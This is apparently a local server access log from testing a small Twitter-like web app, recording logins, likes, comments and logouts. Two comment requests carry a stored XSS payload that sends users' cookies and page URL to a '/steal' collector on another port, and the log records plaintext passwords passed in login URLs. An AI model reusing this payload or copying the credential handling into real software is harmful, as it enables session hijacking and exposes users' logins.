127.0.0.1 - - [24/Apr/2026 10:31:55] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:31:56] "GET /static/styles.css HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:31:56] "GET /static/auth.js HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:31:56] "GET /favicon.ico HTTP/1.1" 404 -
127.0.0.1 - - [24/Apr/2026 10:32:04] "GET /api/login?username=shuvojitss&password=Shuvojit@12345 HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:04] "GET /main HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:04] "GET /static/styles.css HTTP/1.1" 304 -
127.0.0.1 - - [24/Apr/2026 10:32:04] "GET /static/dashboard.js HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:04] "GET /api/me HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:04] "GET /api/profile HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:04] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:06] "GET /api/tweets/2-4/like HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:06] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:07] "GET /api/tweets/3-1/like HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:07] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:08] "GET /api/tweets/3-1/comments/list HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:14] "GET /api/tweets/1-12/comments/list HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:20] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:20] "GET /api/tweets/1-12/delete HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:20] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:20] "GET /api/profile HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:21] "GET /api/tweets/1-10/comments/list HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:35] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:50] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:57] "GET /api/tweets/1-10/comments?text=<script>new+Image().src%3D'http://127.0.0.1:5001/steal?cookie%3D'%2Bbtoa(document.cookie)%2B"%26url%3D"%2BencodeURIComponent(window.location.href)</script> HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:57] "GET /api/tweets/1-10/comments/list HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:57] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:32:57] "GET /api/profile HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:04] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:19] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:27] "GET /api/tweets/create?content=The+new+agentic+AI+in+the+system HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:27] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:27] "GET /api/profile HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:28] "GET /api/tweets/1-13/like HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:28] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:32] "GET /api/logout HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:32] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:32] "GET /static/styles.css HTTP/1.1" 304 -
127.0.0.1 - - [24/Apr/2026 10:33:32] "GET /static/auth.js HTTP/1.1" 304 -
127.0.0.1 - - [24/Apr/2026 10:33:45] "GET /api/login?username=pijus&password=Shuvojit@12345 HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:45] "GET /main HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:45] "GET /static/styles.css HTTP/1.1" 304 -
127.0.0.1 - - [24/Apr/2026 10:33:45] "GET /static/dashboard.js HTTP/1.1" 304 -
127.0.0.1 - - [24/Apr/2026 10:33:45] "GET /api/me HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:45] "GET /api/profile HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:45] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:48] "GET /api/tweets/2-2/like HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:48] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:49] "GET /api/tweets/2-2/comments/list HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:56] "GET /api/tweets/2-2/comments?text=<script>new+Image().src%3D'http://127.0.0.1:5001/steal?cookie%3D'%2Bbtoa(document.cookie)%2B"%26url%3D"%2BencodeURIComponent(window.location.href)</script> HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:56] "GET /api/tweets/2-2/comments/list HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:56] "GET /api/tweets?q= HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:56] "GET /api/profile HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:59] "GET /api/logout HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:59] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [24/Apr/2026 10:33:59] "GET /static/styles.css HTTP/1.1" 304 -
127.0.0.1 - - [24/Apr/2026 10:33:59] "GET /static/auth.js HTTP/1.1" 304 -
